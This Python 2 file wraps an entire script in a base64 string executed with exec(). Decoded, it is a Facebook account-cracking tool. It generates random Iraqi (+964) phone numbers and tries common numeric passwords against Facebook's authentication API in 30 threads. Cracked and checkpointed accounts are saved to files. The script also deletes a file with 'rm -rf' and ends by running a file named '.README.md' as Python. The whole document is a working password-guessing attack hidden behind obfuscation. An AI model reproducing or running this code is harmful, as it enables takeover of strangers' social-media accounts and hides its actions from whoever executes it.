import base64
exec(base64.b64decode("aW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCByYW5kb20sIGhhc2hsaWIsIHJlLCB0aHJlYWRpbmcsIGpzb24sIHVybGxpYiwgY29va2llbGliLCBnZXRwYXNzCm9zLnN5c3RlbSgncm0gLXJmIC50eHQnKQpmb3IgbiBpbiByYW5nZSg1MDAwKToKICAgIG5tYnIgPSByYW5kb20ucmFuZGludCgxMTExMTExLCA5OTk5OTk5KQogICAgc3lzLnN0ZG91dCA9IG9wZW4oJy50eHQnLCAnYScpCiAgICBwcmludCBubWJyCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ05vIE1vZHVsZSBOYW1lZCB3Z2V0ISB0eXBlOnBpcDIgaW5zdGFsbCB3Z2V0JykKCnRyeToKICAgIGltcG9ydCBtZWNoYW5pemUKZXhjZXB0IEltcG9ydEVycm9yOgogICAgb3Muc3lzdGVtKCdObyBNb2R1bGUgTmFtZWQgTWVjaGFuaXplISB0eXBlOnBpcDIgaW5zdGFsbCBtZWNoYW5pemUnKQogICAgdGltZS5zbGVlcCgxKQogICAgb3Muc3lzdGVtKCdUaGVuIHR5cGU6IHB5dGhvbjIgRkIucHknKQoKaW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCByYW5kb20sIGhhc2hsaWIsIHJlLCB0aHJlYWRpbmcsIGpzb24sIHVybGxpYiwgY29va2llbGliLCByZXF1ZXN0cywgbWVjaGFuaXplCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXIKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLCBtYXhfdGltZT0xKQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldCmJyLmFkZGhlYWRlcnMgPSBbKCd1c2VyLWFnZW50JywgJ0RhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IE5YNTUgQnVpbGQvS09UNTUwNikgW0ZCQU4vRkI0QTtGQkFWLzEwNi4wLjAuMjYuNjg7RkJCVi80NTkwNDE2MDtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2l0X0lUO0ZCUlYvNDU5MDQxNjA7RkJDUi9Qb3N0ZU1vYmlsZTtGQk1GL2FzdXM7RkJCRC9hc3VzO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0FTVVNfWjAwQUQ7RkJTVi81LjA7RkJPUC8xO0ZCQ0EveDg2OmFybWVhYmktdjdhO10nKV0KCmRlZiBrZWx1YXIoKToKICAgIHByaW50ICdUaGFua3MuJwogICAgb3Muc3lzLmV4aXQoKQoKCmRlZiBhY2FrKGIpOgogICAgdyA9ICdhaHRkempjJwogICAgZCA9ICcnCiAgICBmb3IgaSBpbiB4OgogICAgICAgIGQgKz0gJyEnICsgd1tyYW5kb20ucmFuZGludCgwLCBsZW4odykgLSAxKV0gKyBpCgogICAgcmV0dXJuIGNldGFrKGQpCgoKZGVmIGNldGFrKGIpOgogICAgdyA9ICdhaHRkempjJwogICAgZm9yIGkgaW4gdzoKICAgICAgICBqID0gdy5pbmRleChpKQogICAgICAgIHggPSB4LnJlcGxhY2UoJyElcycgJSBpLCAnXHgxYlslczsxbScgJSBzdHIoMzEgKyBqKSkKCiAgICB4ICs9ICdceDFiWzBtJwogICAgeCA9IHgucmVwbGFjZSgnITAnLCAnXHgxYlswbScpCiAgICBzeXMuc3Rkb3V0LndyaXRlKHggKyAnXG4nKQoKCmRlZiBqYWxhbih6KToKICAgIGZvciBlIGluIHogKyAnXG4nOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKCgpkZWYgdGlrKCk6CiAgICB0aXRpayA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQogICAgZm9yIG8gaW4gdGl0aWs6CiAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzk0bVdhaXRpbmcuLi4gXHgxYlsxOzkzbScgKyBvLAogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMSkKCgpkZWYgcHNiKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykKCgpiYWNrID0gMApva3MgPSBbXQppZCA9IFtdCmNwYiA9IFtdCnZ1bG5vdCA9ICdceDFiWzMxbU5vdCBWdWxuJwp2dWxuID0gJ1x4MWJbMzJtVnVsbicKb3Muc3lzdGVtKCdjbGVhcicpCmxvZ28gPSAiIiIgCiAgICAgICAgICAgCiBfX19fX18gICBfX19fX19fIF8gICBfICBfX18gIF8gICBfCnwgIF8gXCBcIC8gL18gICBffCB8IHwgfC8gXyBcfCBcIHwgfAp8IHxfKSBcIFYgLyAgfCB8IHwgfF98IHwgfCB8IHwgIFx8IHwKfCAgX18vIHwgfCAgIHwgfCB8ICBfICB8IHxffCB8IHxcICB8CnxffCAgICB8X3wgICB8X3wgfF98IHxffFxfX18vfF98IFxffAoKXDAzM1szNjsxbUNPREUgQlkgOiBtYWxhIGJlazRzClwwMzNbMzI7MW1DSEFOTkVMIDogdC5tZS9weXRob240NTMKXDAzM1szNTsxbUNIQU5ORUwgOiB0Lm1lL3RlYW00NTMKXDAzM1szMzsxbUdST1BDSEFUOiB0Lm1lL1B5dGhvbjU2NApcMDMzWzM0OzFtdGVsZSBzaHhzZSA6IG1hbGFfYmVrNHMKICAgICAgICAiIiIKbG9nbzIgPSAiIiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCgogICAgICAgIiIiCkNvcnJlY3RVc2VybmFtZSA9ICdtYWxhJwpDb3JyZWN0UGFzc3dvcmQgPSAndXAnCm9zLnN5c3RlbSgnY2xlYXInKQpwcmludCBsb2dvMgpsb29wID0gJ3RydWUnCndoaWxlIGxvb3AgPT0gJ3RydWUnOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoJ1x4MWJbMTs5N21ceGUyXHg5ZVx4YTNceDFiXHgxYlszMTsxbVRPT0wgVVNFUk5BTUU6ICcpCiAgICBpZiB1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWU6CiAgICAgICAgcGFzc3dvcmQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5N21ceGUyXHg5ZVx4YTNceDFiXHgxYlszMTsxbVRPT0wgUEFTU1dPUkQ6ICcpCiAgICAgICAgaWYgcGFzc3dvcmQgPT0gQ29ycmVjdFBhc3N3b3JkOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtceGUyXHg5Y1x4OTNdIFRhd2F3YSAgJyArIHVzZXJuYW1lCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgbG9vcCA9ICdmYWxzZScKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAnUGFzcyBIYWxheWEnCiAgICBlbHNlOgogICAgICAgIHByaW50ICdVc2VyIEhhbGF5YScKCmRlZiBsaXNlbnNpKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIG1lbnUoKQpkZWYgbWVudSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnXHgxYlsxOzk3bVsxXVx4MWJbMTs5N20gTlVNQkVSIElSQVEnCiAgICBwcmludCAnXHgxYlsxOzk3bVsyXVx4MWJbMTs5N20gTlVNQkVSIEVSQklMJwogICAgcHJpbnQgJ1x4MWJbMTs5N21bM11ceDFiWzE7OTdtIE5VTUJFUiBTTEVNQU5JJwogICAgcHJpbnQgJ1x4MWJbMTs5N21bNF1ceDFiWzE7OTdtIE5VTUJFUiBLdXJkaXN0YW4nCiAgICBwcmludCAnXHgxYlsxOzk3bVs1XVx4MWJbMTs5N20gIEZSRUUgTU9ERSBcMDMzWzkybVtObyBDUF0gXDAzM1s5N20nCiAgICBwcmludCAnXG5ceDFiWzE7OTdtWzBdICBFeGl0ICAgICAgICAgICAgJwogICAgcHJpbnQgJ1x4MWJbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbicKICAgIGFjdGlvbigpCgoKZGVmIGFjdGlvbigpOgogICAgZ2xvYmFsIGNwYgogICAgZ2xvYmFsIG9rcwogICAgcGVhayA9IHJhd19pbnB1dCgnXG5ceDFiWzE7OTdtQ2hvb3NlIGFuIE9wdGlvbiA6IFx4MWJbMTs5N20nKQogICAgaWYgcGVhayA9PSAnJzoKICAgICAgICBwcmludCAnWyFdIEZpbGwgSW4gQ29ycmVjdGx5JwogICAgICAgIGFjdGlvbigpCiAgICBlbGlmIHBlYWsgPT0gJzEnOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXHgxYlsxOzk3bUFSRUEgQ09ERVMgJyArICdcbicKICAgICAgICBwcmludCAnXHgxYlsxOzk3bTc3MC03NzEtNzcyLTc3My03NzQtNzUwLTc1MS03NTItNzUzLTc1NC03ODAtNzgxLTc4Mi03ODMtNzg0JyArICdcbicKICAgICAgICB0cnk6CiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5N21DSE9PU0UgQ09ERTogJykKICAgICAgICAgICAgayA9ICcrOTY0JwogICAgICAgICAgICBpZGxpc3QgPSAnLnR4dCcKICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6CiAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQoKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1shXSBGaWxlIE5vdCBGb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblsgQmFjayBdJykKICAgICAgICAgICAgbWVudSgpCgogICAgZWxpZiBwZWFrID09ICcyJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21BUkVBIENPREVTICcgKyAnXG4nCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N203NTAtNzUxLTc1Mi03NTMtNzU0LTc4MC03ODEtNzgyLTc4My03ODQnICsgJ1xuJwogICAgICAgIHRyeToKICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFOiAnKQogICAgICAgICAgICBrID0gJys5NjQnCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCgogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBtZW51KCkKCiAgICBlbGlmIHBlYWsgPT0gJzMnOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXHgxYlsxOzk3bUFSRUEgQ09ERVMgJyArICdcbicKICAgICAgICBwcmludCAnXHgxYlsxOzk3bTc3MC03NzEtNzcyLTc3My03NzRcbicKICAgICAgICB0cnk6CiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5N21DaG9vc2UgIENvZGUgOiAnKQogICAgICAgICAgICBrID0gJys5NjQnCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCgogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBtZW51KCkKCiAgICBlbGlmIHBlYWsgPT0gJzQnOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAnXHgxYlsxOzk3bUFSRUEgQ09ERVMgJyArICdcbicKICAgICAgICBwcmludCAnXHgxYlsxOzk3bTc3MC03NzEtNzcyLTc3My03NzQtNzUwLTc1MS03NTItNzUzLTc1NC03ODAtNzgxLTc4Mi03ODMtNzg0JyArICdcbicKICAgICAgICB0cnk6CiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJ1x4MWJbMTs5N21DSE9PU0UgQ09ERTogJykKICAgICAgICAgICAgayA9ICcrOTY0JwogICAgICAgICAgICBpZGxpc3QgPSAnLnR4dCcKICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6CiAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQoKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1shXSBGaWxlIE5vdCBGb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblsgQmFjayBdJykKICAgICAgICAgICAgbWVudSgpCgogICAgZWxpZiBwZWFrID09ICc1JzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21BUkVBIENPREVTICcgKyAnXG4nCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N203NzAtNzcxLTc3Mi03NzMtNzc0LTc1MC03NTEtNzUyLTc1My03NTQtNzgwLTc4MS03ODItNzgzLTc4NCcgKyAnXG4nCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjID0gcmF3X2lucHV0KCdceDFiWzE7OTdtQ0hPT1NFIENPREUgOiAnKQogICAgICAgICAgICBrID0gJys5NjQnCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCgogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBtZW51KCkKCiAgICBlbGlmIHBlYWsgPT0gJzAnOgogICAgICAgIG1lbnUoKQogICAgZWxzZToKICAgICAgICBwcmludCAnWyFdIEZpbGwgSW4gQ29ycmVjdGx5JwogICAgICAgIGFjdGlvbigpCiAgICB4eHggPSBzdHIobGVuKGlkKSkKICAgIHBzYignW1x4ZTJceDljXHg5M10gQUxMIE5VTUJFUlM6ICcgKyB4eHgpCiAgICB0aW1lLnNsZWVwKDAuNSkKICAgIHBzYignW1x4ZTJceDljXHg5M10gQ3JhY2sga3JkbmFrYSBkYXN0ZSBwZWtyZCAnKQogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwc2IoJ1tceGUyXHg5Y1x4OTNdIFRrYXlhIGNoYXdhcndhbiBiYS4uLicpCiAgICB0aW1lLnNsZWVwKDAuNSkKICAgIHBzYignWyFdIEJvIFdhc3RhbiBEbmUgVG9vbGFrYSBDdHJsIFonKQogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwcmludCAnXHgxYlsxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJwoKICAgIGRlZiBtYWluKGFyZyk6CiAgICAgICAgdXNlciA9IGFyZwogICAgICAgIHRyeToKICAgICAgICAgICAgb3MubWtkaXIoJ1hvc2gnKQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICBwYXNzCgogICAgICAgIHRyeToKICAgICAgICAgICAgcGFzczEgPSB1c2VyCiAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQogICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtTVUNDRVNTRlVMTExdXHgxYlsxOzkybSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MxICsgJ1xuJyArICdcbicKICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvc3VjY2Vzc2Z1bGwudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArICc+Pj4nICsgcGFzczEgKyAnXG4nKQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtDSEVLUE9JTlRdXHgxYlsxOzkxbSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MxICsgJ1xuJwogICAgICAgICAgICAgICAgY3BzID0gb3Blbignc2F2ZS9jaGVja3BvaW50LnR4dCcsICdhJykKICAgICAgICAgICAgICAgIGNwcy53cml0ZShrICsgYyArIHVzZXIgKyAnPj4+JyArIHBhc3MxICsgJ1xuJykKICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpCiAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgcGFzczEpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzMiA9ICcxMTIyMzM0NDU1JwogICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczIgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykKICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1bU1VDQ0VTU0ZVTExdXHgxYlsxOzkybSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MyICsgJ1xuJyArICdcbicKICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvc3VjY2Vzc2Z1bGwudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArICc+Pj4nICsgcGFzczIgKyAnXG4nKQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMikKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtDSEVLUE9JTlRdXHgxYlsxOzkxbSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MyICsgJ1xuJwogICAgICAgICAgICAgICAgY3BzID0gb3Blbignc2F2ZS9jaGVja3BvaW50LnR4dCcsICdhJykKICAgICAgICAgICAgICAgIGNwcy53cml0ZShrICsgYyArIHVzZXIgKyAnPj4+JyArIHBhc3MyICsgJ1xuJykKICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpCiAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgcGFzczIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzMyA9ICcxMjM0NTU0MzIxJwogICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczMgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykKICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm1bU1VDQ0VTU0ZVTExdXHgxYlsxOzkybSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MzICsgJ1xuJyArICdcbicKICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvc3VjY2Vzc2Z1bGwudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArICc+Pj4nICsgcGFzczMgKyAnXG4nKQogICAgICAgICAgICAgICAgb2tiLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMykKICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtDSEVLUE9JTlRdXHgxYlsxOzkxbSAnICsgayArIGMgKyB1c2VyICsgJyA+Pj4gJyArIHBhc3MzICsgJ1xuJwogICAgICAgICAgICAgICAgY3BzID0gb3Blbignc2F2ZS9jaGVja3BvaW50LnR4dCcsICdhJykKICAgICAgICAgICAgICAgIGNwcy53cml0ZShrICsgYyArIHVzZXIgKyAnPj4+JyArIHBhc3MzICsgJ1xuJykKICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpCiAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgcGFzczMpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzNCA9ICcxMTIyMzM0NDU1NjYnCiAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzNCArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQogICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtTVUNDRVNTRlVMTF1ceDFiWzE7OTJtICcgKyBrICsgYyArIHVzZXIgKyAnID4+PiAnICsgcGFzczQgKyAnXG4nICsgJ1xuJwogICAgICAgICAgICAgICAgb2tiID0gb3Blbignc2F2ZS9zdWNjZXNzZnVsbC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgJz4+PicgKyBwYXNzNCArICdcbicpCiAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjICsgdXNlciArIHBhc3M0KQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW0NIRUtQT0lOVF1ceDFiWzE7OTFtICcgKyBrICsgYyArIHVzZXIgKyAnID4+PiAnICsgcGFzczQgKyAnXG4nCiAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzYXZlL2NoZWNrcG9pbnQudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArICc+Pj4nICsgcGFzczQgKyAnXG4nKQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzNCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBwID0gVGhyZWFkUG9vbCgzMCkKICAgIHAubWFwKG1haW4sIGlkKQogICAgcHJpbnQgNDIgKiAnXHgxYlsxOzkxbT0nCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTNtIFByb2Nlc3MgSGFzIEJlZW4gQ29tcGxldGVkIC4uLi4nCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTJtIFRvdGFsIHN1Y2Nlc3NmdWxsL1x4MWJbMTs5Nm1jaGVja3BvaW50IDogJyArIHN0cihsZW4ob2tzKSkgKyAnLycgKyBzdHIobGVuKGNwYikpCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTFtIENQIEZpbGUgSGFzIEJlZW4gU2F2ZWQgOiBzYXZlL2NoZWNrcG9pbnQudHh0JwogICAgcmF3X2lucHV0KCdcbltQcmVzcyBFbnRlciBUbyBHbyBCYWNrXScpCiAgICBvcy5zeXN0ZW0oJ3B5dGhvbjIgLlJFQURNRS5tZCcpCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtZW51KCk="))
